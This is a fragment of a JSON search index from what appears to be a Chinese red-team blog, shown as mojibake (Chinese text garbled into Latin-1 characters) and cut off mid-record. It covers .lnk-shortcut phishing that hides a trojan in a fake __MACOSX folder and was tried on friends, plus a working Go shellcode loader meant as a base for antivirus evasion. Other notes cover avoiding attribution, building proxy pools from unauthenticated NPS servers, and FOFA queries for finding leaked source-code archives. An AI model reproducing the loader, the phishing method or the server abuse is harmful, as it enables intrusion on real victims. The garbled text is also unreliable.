çª—å£å¯åŠ¨æœ¨é©¬ï¼Œå¹¶ç”¨è®°äº‹æœ¬æ‰“å¼€txtæ–‡ä»¶\næˆ‘ä»¬å¯ä»¥åœ¨txtä¸­å†™ä¸€äº›å¼•äººæ³¨æ„çš„ä¸œè¥¿ï¼Œæ¯”å¦‚æˆ‘çš„é˜Ÿå‹å–œæ¬¢åšMISCï¼Œæˆ‘å°±ç»™ä»–æ¥ä¸€é“éšå†™é¢˜ï¼ˆå…¶å®æˆ‘ä¹±å†™çš„ï¼Œæ— è§£ï¼‰ï¼š\næ¥ä¸‹æ¥å›åˆ°å¿«æ·æ–¹å¼çš„ç›®å½•ï¼Œå°†__MACOSXæ–‡ä»¶å¤¹åŠå…¶å†…å®¹è®¾ç½®ä¸ºéšè—ï¼š\nè¿™æ ·è¢«å®³è€…å°±çœ‹ä¸åˆ°æ¶æ„æ–‡ä»¶å¤¹äº†ï¼Œå³ä½¿å‘ç°ä¹Ÿä¼šè§‰å¾—æ˜¯macç”µè„‘å‹ç¼©æ—¶äº§ç”Ÿçš„æ— ç”¨æ–‡ä»¶\næ¥ä¸‹æ¥å°±æ˜¯æ‰“åŒ…ï¼Œæ³¨æ„ä¸è¦ç”¨ç³»ç»Ÿè‡ªå¸¦å‹ç¼©åŠŸèƒ½ï¼Œä¸€å®šè¦ç”¨7-zipæˆ–è€…WinRARï¼Œè¿™ä¿©åœ¨æ‰“åŒ…æ—¶èƒ½ä¿ç•™éšè—æ–‡ä»¶å¤¹çš„ä¿¡æ¯ï¼Œä¸ç„¶è§£å‹åæ— æ³•éšè—æ–‡ä»¶å¤¹\nå®Œæˆåæˆ‘ä»¬å°±å¯ä»¥å®ç°éšè”½çš„è§¦å‘æœ¨é©¬ä¸Šçº¿äº†ï¼Œå‘ç»™é˜Ÿå‹è¯•è¯•ï¼š\næ¥ä¸‹æ¥å°±æ˜¯é™å¾…ä¸Šçº¿ï¼Œæ²¡è¿‡ä¸€ä¼šï¼š\nå“ˆå“ˆå“ˆå¾ˆæç¬‘ï¼Œçœ‹çœ‹ä»–æ˜¯ä¸æ˜¯è¿˜åœ¨è®¤çœŸè§£é¢˜ï¼š\nå“ˆå“ˆå“ˆè§£ä¸å‡ºæ¥é—®è±†åŒ…äº†ï¼Œå˜²è®½ä¸€æ‰‹ï¼š æ¥ä¸‹æ¥å°±æ˜¯å‘Šè¯‰ä»–çœŸç›¸äº’ç›¸é—®å€™çš„ç‰‡æ®µäº†ï¼Œä¹Ÿæ²¡æœ‰è¿›ä¸€æ­¥çš„æ¸—é€äº†\nå¦å¤–æ‰¹é‡å‘ç»™å…„å¼Ÿä»¬æµ‹è¯•äº†ä¸€ä¸‹ï¼Œéƒ½æ˜¯ç¨³ç¨³ä¸Šçº¿äº†ï¼š\né‚£ä¹ˆæœ¬æ¬¡é’“é±¼æµ‹è¯•å°±åˆ°æ­¤ç»“æŸï¼Œå¯è§lnkæ–‡ä»¶é’“é±¼è¿˜ç®—æ˜¯æ¯”è¾ƒéšè”½çš„ä¸€ç§ä¸Šçº¿æ–¹å¼ï¼Œå½“ç„¶ä¹Ÿæ¯”è¾ƒä¾¥å¹¸ï¼Œç®—å‡†äº†ä»–ä»¬ä¸å¯èƒ½åœ¨ç”µè„‘è£…360çš„å¿ƒç†ğŸ˜†\nä¸€äº›ç¬”è®° å…³äºsyscall æˆ‘ä»¬åœ¨åŠ è½½å™¨ä¸­ä½¿ç”¨ syscall.MustLoadDLLæ¥è·å–dllï¼Œåœ¨æŸäº›ä¼šè¢«è¯†åˆ«çš„æƒ…å†µä¸‹å¯ä»¥å°è¯•è¿™äº›ï¼š\nkernel32 := syscall.LoadDLL(\u0026#34;kernel32.dll\u0026#34;) kernel32 := syscall.FindProc(\u0026#34;kernel32.dll\u0026#34;) kernel32 := syscall.MustFindProc(\u0026#34;kernel32.dll\u0026#34;) kernel32 := syscall.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) kernel32 := syscall.NewProc(\u0026#34;kernel32.dll\u0026#34;) é™¤syscallä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨golang.org/x/sys/windowsçš„åº“ï¼š\nkernel32 := windows.NewLazySystemDLL(\u0026#34;kernel32.dll\u0026#34;) ",
        "summary": "å°è®°goåŠ è½½å™¨å…æ€+lnkæ–‡ä»¶é’“é±¼æ€è·¯ æœ¬ç¯‡æ–‡ç« å…·æœ‰æ—¶æ•ˆæ€§ï¼Œå¯èƒ½è¿‡ä¸€ä¸¤ä¸ªæœˆè¿™äº›åŠ è½½å™¨ä¹Ÿè·‘ä¸æ‰äº†\næ³¨: æœ¬äººéä¸“ä¸šäºŒè¿›åˆ¶ç ”ç©¶äººå‘˜ï¼Œå­¦ä¹ å…æ€ä»…ä¸ºæ—¥å¸¸æ”»é˜²åœºæ™¯æå‡å¯¹æŠ—èµ„æœ¬ï¼Œå¦‚æœ‰æŠ€æœ¯é”™è¯¯æ¬¢è¿çº æ­£\nåŸºç¡€åŠ è½½å™¨ åŸºç¡€æ ¼å¼å¦‚ä¸‹ï¼Œæœ‰cmdå¼¹çª—ï¼š\npackage main import ( \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) func main() { shellcode := []byte{} // 1ã€è·å–dll kernel32 := syscall.MustLoadDLL(\u0026#34;kernel32.dll\u0026#34;) // 2ã€è°ƒç”¨dllçš„å‡½æ•° VirtualAlloc := kernel32.MustFindProc(\u0026#34;VirtualAlloc\u0026#34;) RtlMoveMemory := kernel32.MustFindProc(\u0026#34;RtlMoveMemory\u0026#34;) CreateThread := kernel32.MustFindProc(\u0026#34;CreateThread\u0026#34;) WaitForSingleObject := kernel32.MustFindProc(\u0026#34;WaitForSingleObject\u0026#34;) // 3ã€ç”³è¯·å†…å­˜ addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40) // 4ã€å¤åˆ¶shellcodeåˆ°å†…å­˜ä¸­ RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(\u0026amp;shellcode[0])), uintptr(len(shellcode))) // 5ã€åˆ›å»ºçº¿ç¨‹ thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0) // 6ã€è¿è¡Œ WaitForSingleObject.Call(thread, 0xFFFFFFFF) // 7.å…³é—­ DLL kernel32.Release() } æˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªåŸºç¡€åŠ è½½å™¨è¿›è¡Œåç»­çš„å…æ€\n"
    }
,
    {
        "title": "æ”»é˜²ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0/",
        "content": "æ”»é˜²ç¬”è®° ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ€è·¯æ€»ç»“ Step1ï¼š (æµ‹ç»˜å¼•æ“ã€oneforallã€subfinder)\nä¸»åŠ¨å¯¹è¢«åŠ¨ä¿¡æ¯æ”¶é›†è·å–çš„æ‰€æœ‰ä¸»åŸŸåè¿›è¡Œå­åŸŸåçˆ†ç ´ï¼Œæ‰©å¤§æ”»å‡»é¢\nStep2ï¼š (Masscan)\nå°†å‰ä¸¤è½®ï¼ˆè¢«åŠ¨ã€ä¸»åŠ¨ï¼‰æ”¶é›†åˆ°çš„æ‰€æœ‰å­åŸŸåå»é‡å¤åè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œå¾—åˆ°domain:portçš„æ ¼å¼èµ„äº§\nå°†å‰ä¸¤è½®ï¼ˆè¢«åŠ¨ã€ä¸»åŠ¨ï¼‰æ”¶é›†åˆ°çš„æ‰€æœ‰IPï¼ˆæ’é™¤CDNï¼‰å»é‡å¤åè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œå¾—åˆ°IP:Portæ ¼å¼èµ„äº§\nStep3ï¼š ï¼ˆhttpxï¼‰\nå°†ip:portã€domain:portæ ¼å¼çš„èµ„äº§ç”¨HTTPXç”¨äºå­˜æ´»éªŒè¯ï¼Œå› ä¸ºHTTPä¸å±äºæ¼æ´åˆ©ç”¨ï¼Œæä½æ¦‚ç‡è¢«å°\nIP è·å–URL\nï¼ˆarlï¼‰\nå°†ip:portã€domain:portæ ¼å¼çš„èµ„äº§ç”¨EZã€ARLè¿›è¡ŒURLæ¢æµ‹(ä»…æ¢æµ‹ï¼Œå…³é—­æ¼æ‰«åŠŸèƒ½) æœåŠ¡è¯†åˆ« è·å–URL\nä»¥åŠç«¯å£æŒ‡çº¹ä¿¡æ¯ ï¼ˆé˜²æ­¢åœ¨ä¿¡æ¯æ”¶é›†é˜¶æ®µå°±è¢«å°IPï¼‰\nå°†IPã€å­åŸŸåç»™EZï¼Œè®©EZè‡ªå·±åšä¸€è½®top2000ç«¯å£çš„æ‰«æï¼Œå¹¶ç”ŸæˆURLã€ç«¯å£æŒ‡çº¹ä¿¡æ¯\nStep4ï¼š æŒ‡çº¹è¯†åˆ«ï¼š\nARLã€EZä¼šè‡ªåŠ¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯¥æ“ä½œä¼šæœ‰å¯èƒ½è§¦å‘æ¼æ´ï¼Œæ— æ³•é¿å…\né€šè¿‡Fingerã€eholeå¯¹æ‰€æœ‰å­˜æ´»çš„éç©ºURLè¿›è¡ŒWEBèµ„äº§æŒ‡çº¹è¯†åˆ«\nStep5ï¼š å°†URLä¸­æœ‰WEBæœåŠ¡çš„èµ„äº§ï¼Œå»é‡å¤ä¹‹åï¼Œè¿›è¡ŒJSæ–‡ä»¶æ¢æµ‹ã€æ¥å£æ¢æµ‹ç­‰\nå°†404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢çš„èµ„äº§è¿›è¡Œè·¯å¾„æ¢æµ‹\nStep6ï¼š å¯¹æ‰€æœ‰çš„æœ‰åŠŸèƒ½çš„ã€æ­£å¸¸çš„ç½‘ç«™ï¼Œé€šè¿‡content-lengthå»é‡å¤ä¹‹åï¼Œè¿›è¡Œè·¯å¾„æ¢æµ‹ï¼Œæ¥å£æ¢æµ‹ï¼ŒåŒ…æ‹¬\nï¼ˆ404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢ï¼‰çš„ç½‘ç«™åœ¨çˆ†ç ´æ‰¾åˆ°å…¥å£è·¯å¾„ä¹‹\nåï¼Œä¹Ÿéœ€è¦æ”¾è¿›æ¥ï¼Œè¯¥ç›®çš„æ˜¯ä¸ºäº†æ¢æµ‹ç½‘ç«™çš„æ•æ„Ÿç›®å½•ï¼Œæ¥å£æ³„éœ²æƒ…å†µï¼Œæœªæˆæƒæƒ…å†µç­‰\nå»é‡å¤çš„é€»è¾‘ 404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢ ä¸è¦å»é‡å¤ å…ˆå»çˆ†ç ´è·¯å¾„\né’ˆå¯¹çŠ¶æ€ç ï¼Œtitleæ­£å¸¸æ˜¾ç¤ºï¼Œconent-length ä¸èƒ½è¿‡å° æ€»ç»“ ï¼šå°±æ˜¯æ¯”è¾ƒæ­£å¸¸ åŠŸèƒ½å¥å…¨çš„ç½‘ç«™ å¯ä»¥å»é‡å¤\næ–¹ä¾¿æˆ‘ä»¬æ•´ç†\nå› ä¸ºåç»­ä¼šå°†æœ‰åŠŸèƒ½çš„ç½‘ç«™åŠ å…¥åˆ°JSæ‰«æå’Œæ‰‹å·¥æ¸—é€æµ‹è¯•ã€‚æ‰€ä»¥éœ€è¦æ’é™¤å¾ˆæ±¡æŸ“é¡¹ã€‚\nstep5å’Œstep6å­˜åœ¨éƒ¨åˆ†å†—ä½™ï¼Œä¸­é—´æœ‰ä¸ªåº¦éœ€è¦è‡ªå·±æŠŠæ§ï¼Œè¶Šéš¾æ¸—é€çš„èµ„äº§ï¼Œç›®å½•éå†çš„æ¬¡æ•°åº”è¯¥æ›´å¤šï¼Œ\næ‰èƒ½å‘ç°è–„å¼±ç‚¹\nå¯ä»¥fuzzæ¥å£ï¼Œå¯ä»¥åµŒå¥—fuzzè·¯å¾„ï¼Œæ¯”å¦‚æŸä¸ªurl æˆ‘ä»¬å‘ç°/webç›®å½•æ˜¯ç½‘ç«™å…¥å£ï¼Œè¿˜å¯ä»¥å†å¯¹/webè¿™ä¸ª\nç›®å½•è¿›è¡Œç›®å½•çˆ†ç ´\nå‰äº”æ­¥å¯ä»¥ç…§ç€åšï¼Œåé¢5ã€6ï¼Œé‡Œé¢ä¼šæ¶‰åŠåˆ°é€’å½’æ‰«æURLï¼Œé‡å¤çš„æ‰«æï¼ˆæ¯”å¦‚http://192.168.1.1æ‰«äº†\nä¹‹åï¼Œå‘ç°å­˜åœ¨/webè·¯å¾„ï¼Œé‚£ä¹ˆç»§ç»­æ‰«http://192.168.1.1/webï¼‰ï¼Œæ‰©å¤§å­—å…¸çš„æ‰«æï¼Œç»“åˆå·²çŸ¥è·¯å¾„å†\nå¾ªç¯çˆ†ç ´çš„æ“ä½œï¼Œå¤§å®¶æ ¹æ®å®é™…æƒ…å†µåˆ©ç”¨\næ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘ä¸€æ­¥ä¸€æ­¥å±•å¼€\nå­åŸŸåçˆ†ç ´\nåœ¨è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„ç¯èŠ‚ï¼Œæˆ‘ä»¬æ‹¿åˆ°çš„å­åŸŸåéƒ½æ˜¯åŸºäºå„\nå·¥ä½œæµ ç¬¬ä¸€è½® ç›®æ ‡å•ä½\u0026ndash;ã€‹å‘ç°åŸŸå\u0026ndash;ã€‹èµ„äº§æµ‹ç»˜å¹³å°ç¬¬ä¸€æ³¢ä¿¡æ¯æ”¶é›†ï¼ˆdomain=\u0026ldquo;qianxin.com\u0026rdquo;ï¼‰\u0026ndash;\u0026gt;å°†è·å–åˆ°çš„IP ç«¯\nå£ä¿¡æ¯ç”¨äºURLæ¢æµ‹ã€æŒ‡çº¹è¯†åˆ«ã€æœåŠ¡è¯†åˆ«\nresultï¼šè·å–åˆ°åŸºäºIPï¼športçš„åº”ç”¨æŒ‡çº¹ä¿¡æ¯ ä»¥åŠåŸºäºURLçš„å„ç§ç½‘é¡µé“¾æ¥åŠå…¶WEBæŒ‡çº¹ä¿¡æ¯\nç¬¬äºŒè½® åŸŸå\u0026ndash;\u0026gt;oneforallã€subfinderã€arlã€ez é€šè¿‡VPSæˆ–å…¶ä»–ä¸»æœºè¿›è¡ŒæŒ‚æœºæ‰«æ è·å–ç›®æ ‡å­åŸŸå\nï¼ˆå»ºè®®VPSæˆ–todeskè¿œæ§å…¶ä»–ä¸»æœºè¿›è¡Œè¯¥æ“ä½œï¼Œç¬¬äºŒè½®å’Œç¬¬ä¸€è½®çš„IPæœ€å¥½åŒºåˆ†å¼€ï¼Œç¬¬ä¸€è½®æ˜¯è‡ªå·±çš„ç‰©ç†\næœºï¼Œå¾ˆå¤šæ“ä½œå¯èƒ½å¯¼è‡´å·²ç»è¢«å°IPäº†ï¼Œæ‰€ä»¥ç¬¬äºŒè½®é€šè¿‡å¦ä¸€ä¸ªIPæˆ–è€…ä»£ç†æ± ï¼Œå¯ä»¥å‘ç°æ˜¯å¦å‡ºç°äº†è¢«å°IP\nçš„é—®é¢˜ï¼Œè¿™æ ·èƒ½æ”¶é›†åˆ°æ›´å¤šå¯èƒ½å› ä¸ºè¢«å°IPè€Œæ¼æ‰çš„æŒ‡çº¹ä¿¡æ¯æˆ–è€…æ¼æ´ï¼‰\nå°†ç¬¬ä¸€è½®çš„ç»“æœè¿›è¡Œæ¼æ´åˆ©ç”¨ï¼ˆä¹Ÿå»ºè®®ä½¿ç”¨VPSï¼Œä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨å¯ä»¥æ˜¯åŒä¸€å°ï¼Œæ¼æ‰«ä¸è¦ç”¨æœ¬\næœºï¼‰\nå’Œæ‰‹å·¥æµ‹è¯•ï¼ˆç‰©ç†æœºæœ¬æœº æ‰‹æœºå¼€å¯ç§»åŠ¨çƒ­ç‚¹è¿›è¡Œï¼Œæ‰‹å·¥æµ‹è¯•ä¸å®¹æ˜“è¢«å°IPï¼Œä¸è¦ä½¿ç”¨å®¶åº­å®½å¸¦ç”¨äºæ¸—é€\næµ‹è¯•ï¼Œå®åœ¨æ‹…å¿ƒé£é™©å»ºè®®ç”¨proxifierå…¨å±€æµé‡socksä»£ç†è¿›è¡Œ\nï¼ˆå…³äºä»£ç†æ–¹é¢çš„å»ºè®®ï¼šéå®Œå…¨å±‚é¢çš„å…¨æµé‡ä»£ç†ï¼Œå¤§éƒ¨åˆ†tcpç¡®å®èƒ½èµ°å…¨å±€ï¼Œicmpæ— æ³•ä»£ç†ï¼Œæƒ³è¦è§„é¿\næº¯æºé£é™©å¯é€šè¿‡è™šæ‹Ÿæœºï¼ˆä»…ä¸»æœºæ¨¡å¼ï¼‰è¿æ¥å®¿ä¸»æœºshadows socksæœåŠ¡ç«¯å‡ºç½‘ï¼Œä½†æ˜¯æ•ˆç‡è¾ƒä½ï¼Œé€šå¸¸ç”¨\näºAPTå·¥ä½œï¼‰ï¼‰\nç¬¬ä¸‰è½® å°†VPSã€ ç¬¬ä¸‰æ–¹ä¸»æœºçš„æ”¶é›†ç»“æœæ±‡æ€»å»é‡å¤ï¼ˆç¬¬ä¸€è½®å·²ç»æ‰«è¿‡ï¼Œè€ƒè™‘åˆ°æ•ˆç‡è¿™é‡Œå°†æ‰«è¿‡çš„å»æ‰é‡å¤é¡¹ï¼‰\nè¿›è¡Œæ–°ä¸€è½®è‡ªåŠ¨åŒ–æ¼æ‰« å’Œæ‰‹å·¥æ¸—é€\nåç»­æ‰“ç‚¹ç« èŠ‚ç»†è®²\nåç»­æ ¹æ®æˆæœæƒ…å†µ è€ƒè™‘æ˜¯å¦éœ€è¦é‡æ–°æ‰«æå’Œæ‰‹å·¥æ¸—é€\né˜²å¾¡è§„é¿ 1.æœ¬æœºå°½é‡ä¸è¦å»åšä¸»åŠ¨æŒ‡çº¹è¯†åˆ«ã€æ¼æ‰«xrayçš„æ“ä½œ æˆ‘ä¸ªäººæ˜¯ä¼˜å…ˆæœ¬æœºå»åšæ‰‹å·¥æ¸—é€ï¼Œéœ€è¦IPå¯ç”¨ï¼ŒæŒ‚\nä»£ç†å§‹ç»ˆæ²¡æœ‰æœ¬æœºæ–¹ä¾¿\n2.æ¼æ‰«ã€æŒ‡çº¹è¯†åˆ«ã€åŸŸåæ”¶é›† è¿™ç§è„šæœ¬åŒ–ã€å·¥å…·åŒ–çš„ä¸œè¥¿éƒ½å¯ä»¥VPSã€ç¬¬ä¸‰æ–¹ä¸»æœºæå®š\n3.ä¸€å®šè¦å…ˆä¿¡æ¯æ”¶é›†ï¼Œåæ¼æ‰«ï¼Œä¸ºäº†ç¡®ä¿åœ¨æ¼æ‰«å‰ï¼Œæˆ‘ä»¬çš„IPæ˜¯å¹²å‡€çš„ï¼Œæ²¡æœ‰è¢«å°ç¦çš„ã€‚ è¿™æ ·æ‰èƒ½æ”¶é›†\nåˆ°æ›´å¤šçš„èµ„äº§ï¼Œæ’é™¤è¢«è¯¯å°çš„æƒ…å†µ\n4.åœ¨çˆ†ç ´è·¯å¾„å‰å…ˆåšHTTPXæ‰¹é‡è¯†åˆ«æ¡†æ¶ã€titleã€content-lengthã€è§£æIPã€JSæ¢æµ‹ç­‰æ“ä½œï¼Œè·Ÿç¬¬ä¸‰æ¡åŒ\nç†ï¼Œå…ˆä¿¡æ¯æ”¶é›†å†æ¼æ‰«ï¼Œå…ˆåšä¸ä¼šè¢«å°IPçš„æ“ä½œï¼Œå†æ¼æ‰«\nå› ä¸ºJSæ¢æµ‹ã€HTTPXåœ¨æ²¡æœ‰æ¶‰åŠåˆ°FUZZçš„æ—¶å€™ï¼Œéƒ½ä¸ä¼šè¢«å°IP\n5.ä¸€æ—¦å¼€å§‹è·¯å¾„æ‰«æã€æ¼æ‰«ã€ARL\\EZè‡ªåŠ¨åŒ–çš„æ—¶å€™ï¼Œå°±å¯ä»¥é»˜è®¤IPä¼šè¢«å°äº†ï¼Œæ¼æ‰«å¯ä»¥è€ƒè™‘ä»£ç†æ± ã€‚\nä»£ç†æ± æ–¹æ¡ˆ å¯ä»¥åˆ©ç”¨ç½‘ä¸Šçš„npsæœªæˆæƒè®¿é—®æ¥æ‰©å……è‡ªå·±çš„ä»£ç†æ± \n1.æ‰¹é‡å¯¼å‡ºFofa npsç«™ç‚¹\n2.èµ„äº§æ¢å­˜æ´»è¿›è¡ŒéªŒè¯\n3.æ‰¹é‡æµ‹è¯•NPSç«™ç‚¹\n4.ç¼–å†™è·å–cookieçš„è„šæœ¬\n(body=\u0026ldquo;nps@ehang.io\u0026rdquo; || body=\u0026ldquo;ehang.io\u0026rdquo;) \u0026amp;\u0026amp; status_code=200 \u0026amp;\u0026amp; after=\u0026ldquo;2025-07-01\u0026rdquo;\nè·å–é—­æºè½¯ä»¶æºç  body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;oa\u0026#34; \u0026amp;\u0026amp; \u0026#34;rar\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;U8\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;EAS\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;k3s\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;kingdee\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;ç³»ç»Ÿ\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;åŠå…¬\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; body=\u0026#34;web.config\u0026#34; \u0026amp;\u0026amp; \u0026#34;EKP\u0026#34; \u0026amp;\u0026amp; country=\u0026#34;CN\u0026#34; ",
        "summary": "æ”»é˜²ç¬”è®° ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ€è·¯æ€»ç»“ Step1ï¼š (æµ‹ç»˜å¼•æ“ã€oneforallã€subfinder)\nä¸»åŠ¨å¯¹è¢«åŠ¨ä¿¡æ¯æ”¶é›†è·å–çš„æ‰€æœ‰ä¸»åŸŸåè¿›è¡Œå­åŸŸåçˆ†ç ´ï¼Œæ‰©å¤§æ”»å‡»é¢\nStep2ï¼š (Masscan)\nå°†å‰ä¸¤è½®ï¼ˆè¢«åŠ¨ã€ä¸»åŠ¨ï¼‰æ”¶é›†åˆ°çš„æ‰€æœ‰å­åŸŸåå»é‡å¤åè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œå¾—åˆ°domain:portçš„æ ¼å¼èµ„äº§\nå°†å‰ä¸¤è½®ï¼ˆè¢«åŠ¨ã€ä¸»åŠ¨ï¼‰æ”¶é›†åˆ°çš„æ‰€æœ‰IPï¼ˆæ’é™¤CDNï¼‰å»é‡å¤åè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œå¾—åˆ°IP:Portæ ¼å¼èµ„äº§\nStep3ï¼š ï¼ˆhttpxï¼‰\nå°†ip:portã€domain:portæ ¼å¼çš„èµ„äº§ç”¨HTTPXç”¨äºå­˜æ´»éªŒè¯ï¼Œå› ä¸ºHTTPä¸å±äºæ¼æ´åˆ©ç”¨ï¼Œæä½æ¦‚ç‡è¢«å°\nIP è·å–URL\nï¼ˆarlï¼‰\nå°†ip:portã€domain:portæ ¼å¼çš„èµ„äº§ç”¨EZã€ARLè¿›è¡ŒURLæ¢æµ‹(ä»…æ¢æµ‹ï¼Œå…³é—­æ¼æ‰«åŠŸèƒ½) æœåŠ¡è¯†åˆ« è·å–URL\nä»¥åŠç«¯å£æŒ‡çº¹ä¿¡æ¯ ï¼ˆé˜²æ­¢åœ¨ä¿¡æ¯æ”¶é›†é˜¶æ®µå°±è¢«å°IPï¼‰\nå°†IPã€å­åŸŸåç»™EZï¼Œè®©EZè‡ªå·±åšä¸€è½®top2000ç«¯å£çš„æ‰«æï¼Œå¹¶ç”ŸæˆURLã€ç«¯å£æŒ‡çº¹ä¿¡æ¯\nStep4ï¼š æŒ‡çº¹è¯†åˆ«ï¼š\nARLã€EZä¼šè‡ªåŠ¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯¥æ“ä½œä¼šæœ‰å¯èƒ½è§¦å‘æ¼æ´ï¼Œæ— æ³•é¿å…\né€šè¿‡Fingerã€eholeå¯¹æ‰€æœ‰å­˜æ´»çš„éç©ºURLè¿›è¡ŒWEBèµ„äº§æŒ‡çº¹è¯†åˆ«\nStep5ï¼š å°†URLä¸­æœ‰WEBæœåŠ¡çš„èµ„äº§ï¼Œå»é‡å¤ä¹‹åï¼Œè¿›è¡ŒJSæ–‡ä»¶æ¢æµ‹ã€æ¥å£æ¢æµ‹ç­‰\nå°†404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢çš„èµ„äº§è¿›è¡Œè·¯å¾„æ¢æµ‹\nStep6ï¼š å¯¹æ‰€æœ‰çš„æœ‰åŠŸèƒ½çš„ã€æ­£å¸¸çš„ç½‘ç«™ï¼Œé€šè¿‡content-lengthå»é‡å¤ä¹‹åï¼Œè¿›è¡Œè·¯å¾„æ¢æµ‹ï¼Œæ¥å£æ¢æµ‹ï¼ŒåŒ…æ‹¬\nï¼ˆ404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢ï¼‰çš„ç½‘ç«™åœ¨çˆ†ç ´æ‰¾åˆ°å…¥å£è·¯å¾„ä¹‹\nåï¼Œä¹Ÿéœ€è¦æ”¾è¿›æ¥ï¼Œè¯¥ç›®çš„æ˜¯ä¸ºäº†æ¢æµ‹ç½‘ç«™çš„æ•æ„Ÿç›®å½•ï¼Œæ¥å£æ³„éœ²æƒ…å†µï¼Œæœªæˆæƒæƒ…å†µç­‰\nå»é‡å¤çš„é€»è¾‘ 404ã€403ã€401ä»¥åŠå„ç§nginxã€apacheã€IISã€springç­‰é»˜è®¤é¡µé¢ ä¸è¦å»é‡å¤ å…ˆå»çˆ†ç ´è·¯å¾„\né’ˆå¯¹çŠ¶æ€ç ï¼Œtitleæ­£å¸¸æ˜¾ç¤ºï¼Œconent-length ä¸èƒ½è¿‡å° æ€»ç»“ ï¼šå°±æ˜¯æ¯”è¾ƒæ­£å¸¸ åŠŸèƒ½å¥å…¨çš„ç½‘ç«™ å¯ä»¥å»é‡å¤\næ–¹ä¾¿æˆ‘ä»¬æ•´ç†\nå› ä¸ºåç»­ä¼šå°†æœ‰åŠŸèƒ½çš„ç½‘ç«™åŠ å…¥åˆ°JSæ‰«æå’Œæ‰‹å·¥æ¸—é€æµ‹è¯•ã€‚æ‰€ä»¥éœ€è¦æ’é™¤å¾ˆæ±¡æŸ“é¡¹ã€‚\nstep5å’Œstep6å­˜åœ¨éƒ¨åˆ†å†—ä½™ï¼Œä¸­é—´æœ‰ä¸ªåº¦éœ€è¦è‡ªå·±æŠŠæ§ï¼Œè¶Šéš¾æ¸—é€çš„èµ„äº§ï¼Œç›®å½•éå†çš„æ¬¡æ•°åº”è¯¥æ›´å¤šï¼Œ\næ‰èƒ½å‘ç°è–„å¼±ç‚¹\nå¯ä»¥fuzzæ¥å£ï¼Œå¯ä»¥åµŒå¥—fuzzè·¯å¾„ï¼Œæ¯”å¦‚æŸä¸ªurl æˆ‘ä»¬å‘ç°/webç›®å½•æ˜¯ç½‘ç«™å…¥å£ï¼Œè¿˜å¯ä»¥å†å¯¹/webè¿™ä¸ª\nç›®å½•è¿›è¡Œç›®å½•çˆ†ç ´\nå‰äº”æ­¥å¯ä»¥ç…§ç€åšï¼Œåé¢5ã€6ï¼Œé‡Œé¢ä¼šæ¶‰åŠåˆ°é€’å½’æ‰«æURLï¼Œé‡å¤çš„æ‰«æï¼ˆæ¯”å¦‚http://192.168.1.1æ‰«äº†\nä¹‹åï¼Œå‘ç°å­˜åœ¨/webè·¯å¾„ï¼Œé‚£ä¹ˆç»§ç»­æ‰«http://192.168.1.1/webï¼‰ï¼Œæ‰©å¤§å­—å…¸çš„æ‰«æï¼Œç»“åˆå·²çŸ¥è·¯å¾„å†\nå¾ªç¯çˆ†ç ´çš„æ“ä½œï¼Œå¤§å®¶æ ¹æ®å®é™…æƒ…å†µåˆ©ç”¨\næ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘ä¸€æ­¥ä¸€æ­¥å±•å¼€\nå­åŸŸåçˆ†ç ´\nåœ¨è¢«åŠ¨ä¿¡æ¯æ”¶é›†çš„ç¯èŠ‚ï¼Œæˆ‘ä»¬æ‹¿åˆ°çš„å­åŸŸåéƒ½æ˜¯åŸºäºå„\nå·¥ä½œæµ ç¬¬ä¸€è½® ç›®æ 